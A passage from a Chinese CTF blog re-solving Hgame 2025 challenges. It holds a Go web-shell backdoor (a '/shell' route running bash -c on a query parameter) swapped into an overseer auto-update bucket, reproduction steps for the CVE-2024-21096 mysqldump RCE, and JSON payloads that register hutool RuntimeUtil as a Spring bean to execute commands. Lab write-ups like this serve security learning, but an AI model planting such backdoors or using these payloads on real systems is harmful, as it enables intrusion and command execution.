class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">minio: <br>    endpoint: <span class="hljs-string">&quot;127.0.0.1:9000&quot;</span> <br>    access_key: <span class="hljs-string">&quot;minio_admin&quot;</span> <br>    secret_key: <span class="hljs-string">&quot;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=&quot;</span> <br>    bucket: <span class="hljs-string">&quot;prodbucket&quot;</span> <br>    key: <span class="hljs-string">&quot;update&quot;</span><br></code></pre></td></tr></table></figure><p>使用 minio client 连接靶机（题目给的第一个地址）获取源码 src.zip</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/HXSJb1TA3oJYHOxAERdcNhQDn7c.png"></p><p>main.go 源码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;level25/fetch&quot;</span><br><br>    <span class="hljs-string">&quot;level25/conf&quot;</span><br><br>    <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>    <span class="hljs-string">&quot;github.com/jpillora/overseer&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    fetcher := &amp;fetch.MinioFetcher&#123;<br>        Bucket:    conf.MinioBucket,<br>        Key:       conf.MinioKey,<br>        Endpoint:  conf.MinioEndpoint,<br>        AccessKey: conf.MinioAccessKey,<br>        SecretKey: conf.MinioSecretKey,<br>    &#125;<br>    overseer.Run(overseer.Config&#123;<br>        Program: program,<br>        Fetcher: fetcher,<br>    &#125;)<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">program</span><span class="hljs-params">(state overseer.State)</span></span> &#123;<br>    g := gin.Default()<br>    g.StaticFS(<span class="hljs-string">&quot;/&quot;</span>, gin.Dir(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">true</span>))<br>    g.Run(<span class="hljs-string">&quot;:8080&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>从源码和<a href="https://baimeow.cn/posts/ctf/d3go/">提示</a>结合对 overseer 的搜索可以发现使用了 overseer 对程序热加载，文件变更后会自动重启更新，解题思路也就是从自更新入手打 RCE。</p><p>那么先在本地修改 main.go 文件，注释掉原有的静态⽂件托管，写入 WP 所给后门</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">program</span><span class="hljs-params">(state overseer.State)</span></span> &#123;<br>        g := gin.Default()<br>        <span class="hljs-comment">// g.StaticFS(&quot;/&quot;, gin.Dir(&quot;.&quot;, true))</span><br>        g.GET(<span class="hljs-string">&quot;/shell&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>                cmd, _ := c.GetQuery(<span class="hljs-string">&quot;cmd&quot;</span>)<br>                out, err := exec.Command(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd).CombinedOutput()<br>                <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>                        c.String(<span class="hljs-number">500</span>, err.Error())<br>                        <span class="hljs-keyword">return</span><br>                &#125;<br>                c.String(<span class="hljs-number">200</span>, <span class="hljs-type">string</span>(out))<br>        &#125;)<br>        g.Run(<span class="hljs-string">&quot;:8080&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>然后使用 <code>go build -o update</code> 编译文件为 update（源文件名）</p><p>再上传覆盖原文件 <code>mc cp ./update ctf-minio/prodbucket/update</code></p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/QpU4boPRwoAChXxDxCKcqBfende.png"></p><p>等自更新完成后向靶机发送 get 请求 RCE，得到 flag（题目给的第二个地址）</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/Nf5Ub89nuodHNuxfPQ8cwEpdnEh.png"></p><p>参考：<a href="https://infernity.top/2025/02/03/Hgame-2025-week1/#Level-25-%E5%8F%8C%E9%9D%A2%E4%BA%BA%E6%B4%BE%E5%AF%B9">https://infernity.top/2025/02/03/Hgame-2025-week1/#Level-25-%E5%8F%8C%E9%9D%A2%E4%BA%BA%E6%B4%BE%E5%AF%B9</a></p><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="Level-21096-HoneyPot-Revenge"><a href="#Level-21096-HoneyPot-Revenge" class="headerlink" title="Level 21096 HoneyPot_Revenge"></a>Level 21096 HoneyPot_Revenge</h3><p>比赛时针对 mysqldump 尝试用网上找到的 mysql 协议伪造程序解题，但未能成功，也没有关注到 CVE-2024-21096 漏洞，看 WP 后问题确实在 mysqldump 上</p><p>参考 WP 和博客 <a href="https://tech.ec3o.fun/2024/10/25/Web-Vulnerability%20Reproduction/CVE-2024-21096/">https://tech.ec3o.fun/2024/10/25/Web-Vulnerability%20Reproduction/CVE-2024-21096/</a> 自行编译一个 mysql 服务进行复现：</p><p>先搭安装编译依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get update<br>sudo apt-get install -y build-essential cmake bison libncurses5-dev libtirpc-dev libssl-dev pkg-config<br>wget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-boost-8.0.34.tar.gz<br>tar -zxvf mysql-boost-8.0.34.tar.gz<br>cd mysql-8.0.34<br></code></pre></td></tr></table></figure><p>然后在 <code>mysql-8.0.34/include</code> 目录下找到 <code>mysql_version.h.in</code> 版本模板文件如下，对其进行修改</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">/* Copyright Abandoned 1996,1999 TCX DataKonsult AB &amp; Monty Program KB</span><br><span class="hljs-comment">   &amp; Detron HB, 1996, 1999-2004, 2007 MySQL AB.</span><br><span class="hljs-comment">   This file is public domain and comes with NO WARRANTY of any kind</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/* Version numbers for protocol &amp; mysqld */</span><br><br>#ifndef _mysql_version_h<br>#<span class="hljs-keyword">define</span> _mysql_version_h<br><br>#<span class="hljs-keyword">define</span> PROTOCOL_VERSION            <span class="hljs-variable">@PROTOCOL_VERSION</span>@<br>#<span class="hljs-keyword">define</span> MYSQL_SERVER_VERSION       &quot;@VERSION@&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_BASE_VERSION         &quot;mysqld-@MYSQL_BASE_VERSION@&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_SERVER_SUFFIX_DEF    &quot;@MYSQL_SERVER_SUFFIX@&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_VERSION_ID            <span class="hljs-variable">@MYSQL_VERSION_ID</span>@<br>#<span class="hljs-keyword">define</span> MYSQL_PORT                  <span class="hljs-variable">@MYSQL_TCP_PORT</span>@<br>#<span class="hljs-keyword">define</span> MYSQL_ADMIN_PORT            <span class="hljs-variable">@MYSQL_ADMIN_TCP_PORT</span>@<br>#<span class="hljs-keyword">define</span> MYSQL_PORT_DEFAULT          <span class="hljs-variable">@MYSQL_TCP_PORT_DEFAULT</span>@<br>#<span class="hljs-keyword">define</span> MYSQL_UNIX_ADDR            &quot;@MYSQL_UNIX_ADDR@&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_CONFIG_NAME          &quot;my&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_PERSIST_CONFIG_NAME  &quot;mysqld-auto&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_COMPILATION_COMMENT  &quot;@COMPILATION_COMMENT@&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_COMPILATION_COMMENT_SERVER  &quot;@COMPILATION_COMMENT_SERVER@&quot;<br>#<span class="hljs-keyword">define</span> LIBMYSQL_VERSION           &quot;@VERSION@&quot;<br>#<span class="hljs-keyword">define</span> LIBMYSQL_VERSION_ID         <span class="hljs-variable">@MYSQL_VERSION_ID</span>@<br><br>#ifndef LICENSE<br>#<span class="hljs-keyword">define</span> LICENSE                     GPL<br>#endif <span class="hljs-comment">/* LICENSE */</span><br><br>#endif <span class="hljs-comment">/* _mysql_version_h */</span><br></code></pre></td></tr></table></figure><p>修改该处即可 <code>#define MYSQL_SERVER_VERSION       &quot;@VERSION@&quot;</code></p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/AnMzbnkRcoHVpGxrVsIcVXzKnoh.png"></p><p>编译（很久，所以上一步修改需谨慎）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir build     //在刚才的mysql目录下<br>cd build<br>cmake .. -DDOWNLOAD_BOOST=1 -DWITH_BOOST=../boost<br>make -j$(nproc)<br></code></pre></td></tr></table></figure><p>安装 MySQL <code>sudo make install</code></p><p>创建⽤⼾组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo groupadd mysql <br>sudo useradd -r -g mysql -s /bin/false mysql<br></code></pre></td></tr></table></figure><p>数据库初始化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo /usr/local/mysql/bin/mysqld --initialize --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data<br></code></pre></td></tr></table></figure><p>并获得初始账号密码</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/SANWbY4RsoYGGJxvcKUcafWtnrd.png"></p><p>设置⽬录权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo chown -R mysql:mysql /usr/local/mysql <br>sudo chown -R mysql:mysql /usr/local/mysql/data<br></code></pre></td></tr></table></figure><p>启动服务、使⽤记录的 root 密码登录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo /usr/local/mysql/bin/mysqld_safe --user=mysql &amp;<br>/usr/local/mysql/bin/mysql -u root -p<br></code></pre></td></tr></table></figure><p>重置密码并创建 test 库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;password&#x27;</span>; <br>FLUSH PRIVILEGES; <br><span class="hljs-keyword">CREATE</span> DATABASE test;<br></code></pre></td></tr></table></figure><p>配置远程连接登录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">use mysql;<br><span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> host <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;root&#x27;</span>;    ##改为<span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-string">&#x27;%&#x27;</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span>允许任何ip访问<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,host <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;    ## 查看用户访问端口如下<br>FLUSH PRIVILEGES;    ## 刷新服务配置项<br>EXIT;<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/X79hbhJtZoMoFcxJia4cGV1Tngg.png"></p><p>查看 mysqldump 版本测试 <code>/usr/local/mysql/bin/mysql --version</code>，可以看到插入的命令</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/O07ab350LoC8euxB8VycO1hLnhf.png"></p><p>虚拟机配置桥接模式，与服务器通过 ssh 反向隧道构建端口映射</p><p>虚拟机上输入</p><p><code>sudo ssh -fN -R （虚拟机端口）3306:``localhost:3306``（服务器端口） 服务器登录账户名@服务器公网ip</code></p><p>虚拟机上可使用 <code>ps aux | grep &quot;ssh -NfR&quot;</code> 查看连接情况</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/KwjpbrjtmoAe6UxLaYHc0BwJnBh.png"></p><p>服务器上输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/ssh/sshd_config   #修改配置加上GatewayPorts yes语句允许反向隧道<br>sudo systemctl restart sshd   #重启 SSH 服务<br>ps aux | grep ssh    #查看SSH隧道状态<br></code></pre></td></tr></table></figure><p>用主机尝试通过服务器 ip 登录 mysql，登录成功</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/FiYabpnbZoZL0FxZ8kucxrdsnsb.png"></p><p>导入靶机数据库</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/AwSJbc2CyogwkVxaKllconORnjd.png"></p><p>访问 <code>/flag</code>，发现成功 RCE，获得 flag</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/JZ5Ib5RCwo2F7VxYyOGcM0gsnlb.png"></p><p>参考：</p><p><a href="https://fanllspd.com/posts/cf41815c/#Level-21096-HoneyPot-Revenge">https://fanllspd.com/posts/cf41815c/#Level-21096-HoneyPot-Revenge</a></p><p><a href="https://tech.ec3o.fun/2024/10/25/Web-Vulnerability">https://tech.ec3o.fun/2024/10/25/Web-Vulnerability%20Reproduction/CVE-2024-21096/</a></p><p><a href="https://blog.csdn.net/INSBUG/article/details/142262709">https://blog.csdn.net/INSBUG/article/details/142262709</a></p><h3 id="Level-60-SignInJava"><a href="#Level-60-SignInJava" class="headerlink" title="Level 60 SignInJava"></a>Level 60 SignInJava</h3><p>赛时没做，现在再看看题目。下载附件，里面一个 SigninJava.jar，在 idea 里 Add as Library 添加为库即可查看源码（jar 文件当做压缩包即可），打开后文件结构如下，应该是用了 spring 框架 MVC 模式</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/DaIabKNmZoAX7sx9WGwcb1e0nVg.png"></p><p>其中 BaseResponse 规定了返回内容的格式，APIGatewayController 作为控制层规定了路由接口和接受请求后控制、调用的规则，HelloService 和 FlagTestService 处理逻辑业务，分别返回“hello xxx”和读取&#x2F;flag，InvokeUtils 和 SpringContextHolder 作为工具或插件，前者可以调用指定 bean 和其指定方法并传入参数，后者可以方便地引用各种 bean 而不需要注入。</p><p>重点看 APIGatewayController 代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> icu.Liki4.signin.controller;<br><br><span class="hljs-keyword">import</span> cn.hutool.core.util.StrUtil;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSON;<br><span class="hljs-keyword">import</span> icu.Liki4.signin.base.BaseResponse;<br><span class="hljs-keyword">import</span> icu.Liki4.signin.util.InvokeUtils;<br><span class="hljs-keyword">import</span> jakarta.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Objects;<br><span class="hljs-keyword">import</span> org.apache.commons.io.IOUtils;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&#123;&quot;/api&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">APIGatewayController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">APIGatewayController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(</span><br><span class="hljs-meta">        value = &#123;&quot;/gateway&quot;&#125;,</span><br><span class="hljs-meta">        method = &#123;RequestMethod.POST&#125;</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> BaseResponse <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> IOUtils.toString(request.getReader());<br>            Map&lt;String, Object&gt; map = (Map)JSON.parseObject(body, Map.class);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">beanName</span> <span class="hljs-operator">=</span> (String)map.get(<span class="hljs-string">&quot;beanName&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> (String)map.get(<span class="hljs-string">&quot;methodName&quot;</span>);<br>            Map&lt;String, Object&gt; params = (Map)map.get(<span class="hljs-string">&quot;params&quot;</span>);<br>            <span class="hljs-keyword">if</span> (StrUtil.containsAnyIgnoreCase(beanName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CharSequence</span>[]&#123;<span class="hljs-string">&quot;flag&quot;</span>&#125;)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BaseResponse</span>(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;flagTestService offline&quot;</span>, (Object)<span class="hljs-literal">null</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> InvokeUtils.invokeBeanMethod(beanName, methodName, params);<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BaseResponse</span>(<span class="hljs-number">200</span>, (String)<span class="hljs-literal">null</span>, result);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br>            <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var8;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BaseResponse</span>(<span class="hljs-number">500</span>, ((Throwable)Objects._requireNonNullElse_(e.getCause(), e)).getMessage(), (Object)<span class="hljs-literal">null</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>只开放了 <code>/api/gateway</code>，可以通过 post 方法 json 格式传递 <code>beanName</code>、<code>methodName</code>、<code>params</code>（Map 类型）三个参数，其中 <code>StrUtil.containsAnyIgnoreCase</code> 对 <code>beanName</code> 字符串检测是否含有 flag（不区分大小写，均过滤），若有则返回 <code>&quot;flagTestService offline&quot;</code>，若无则调用对应的 bean 中的方法，返回结果。</p><p>为了尝试调用 bean 先去了解了一下 Spring 注解自动生成的 Bean 的 name 属性命名规则，在类上加 <code>@``Component</code>、<code>@Repository</code>、<code>@Service</code>、<code>@Controller</code> 注解来定义 bean 时 spring 会自动生成 bean，如果不主动定义 bean 的 name 那么默认以类名称的首字母小写作为 bean 的 name 属性。例如 HelloService 类的 bean 就是 helloService。</p><p>尝试，得到预期返回</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/JFunbdQNBofvZJxJnIvcy1Qqnyg.png"></p><p>尝试调用 flagTestService 未能找到过滤绕过方法</p><p>于是尝试利用 SpringContextHolder，但只能获取实例，无法调用方法获取 flag</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/GOcibFNKUoAWUsxkJxAcNwgTnkd.png"></p><p>后面找不到可行的思路了，开始借鉴网上的博客和 WP，需要寻找其他 bean 可利用的类，然而我不知道他们是如何筛选出目标来的，只知道最终找到的是 hutool 的 RuntimeUtil 具有命令执行的方法，然而该类并没有被注册，所以命令执行前需要先用 hutool 里的注册 bean 的方法。（或许还与反序列化有关？此处并未搞懂）</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/AANIbGG8nonCiCxqc8ncKEC1n1f.png"></p><p>通过 hutool 的 SpringUtil 注册 hutool 的 RuntimeUtil</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-string">&quot;beanName&quot;</span>:<span class="hljs-string">&quot;cn.hutool.extra.spring.SpringUtil&quot;</span>,<br>    <span class="hljs-string">&quot;methodName&quot;</span>:<span class="hljs-string">&quot;registerBean&quot;</span>,<br>    <span class="hljs-string">&quot;params&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;arg0&quot;</span>:<span class="hljs-string">&quot;execCmd&quot;</span>,<br>        <span class="hljs-string">&quot;arg1&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;cn.hutool.core.util.RuntimeUtil&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/Ez63bk1KioiOqOxZ7ajcgtAvnEd.png"></p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/HUxQb0lwOo0cQjx06Kpca5WanZb.png"></p><p>调用 RuntimeUtil 的 execForStr 实现 RCE 获得 flag</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>    <span class="hljs-string">&quot;beanName&quot;</span>:<span class="hljs-string">&quot;execCmd&quot;</span>,<br>    <span class="hljs-string">&quot;methodName&quot;</span>:<span class="hljs-string">&quot;execForStr&quot;</span>,<br>    <span class="hljs-string">&quot;params&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;arg0&quot;</span>:<span class="hljs-string">&quot;utf-8&quot;</span>,<br>        <span class="hljs-string">&quot;arg1&quot;</span>:[<span class="hljs-string">&quot;/readflag&quot;</span>]<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/PcAvbbEvXoBox9xRYWmcRUlHnSK.png"></p><p>参考：<a href="https://www.n0o0b.com/archives/hgame2025-week2#level-60-signinjava">https://www.n0o0b.com/archives/hgame2025-week2#level-60-signinjava</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Computer-cleaner-plus"><a href="#Computer-cleaner-plus" class="headerlink" title="Computer cleaner plus"></a>Computer cleaner plus</h3><p>尝试过检索所有可执行文件、关键目录的查找、按关键字检索、alias 别名、查看进程、启动项、历史命令等等，但未找到恶意可执行文件。</p><p>官方 WP 给出的是 <code>rpm -Vf /usr/bin/*</code>，该指令可以用 rpm 验证 <code>/usr/bin/</code> 目录下所有文件所属的 RPM 软件包是否被修改，我去执行后可以发现 ps 相关内容经过修改</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/Ua8AbUFeso2cndxKo0fcaHJMnHb.png"></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs excel">各字母含义如下：<br>S         文件大小是否改变<br>M         文件的类型或文件的权限（rwx）是否被改变<br><span class="hljs-number">5</span>         文件<span class="hljs-symbol">MD5</span>校验是否改变（可以看成文件内容是否改变）<br>D         设备中，从代码是否改变<br>L         文件路径是否改变<br>U         文件的属主（所有者）是否改变<br>G         文件的属组是否改变<br><span class="hljs-built_in">T</span>         文件的修改时间是否改变<br></code></pre></td></tr></table></figure><p>说明 ps 文件的大小、权限、内容、修改时间均发生变化，下面还有多处</p><p>所以查看 ps 文件，发现可疑 elf 文件即为 flag</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/QJxWbFdjSoHCjFxDST7c0zJVnKb.png"></p><p>这里修改后的命令运行了后门程序 <code>B4ck_D0_oR.elf</code>，然后调用 <code>/.hide_command</code> 下的 ps 命令，再过滤了包含 <code>shell</code> 和 <code>B4ck_D0_oR</code> 的相关内容。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>WriteUp</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化小结</title>
    <link href="/2025/02/01/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/"/>
    <url>/2025/02/01/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/</url>
    
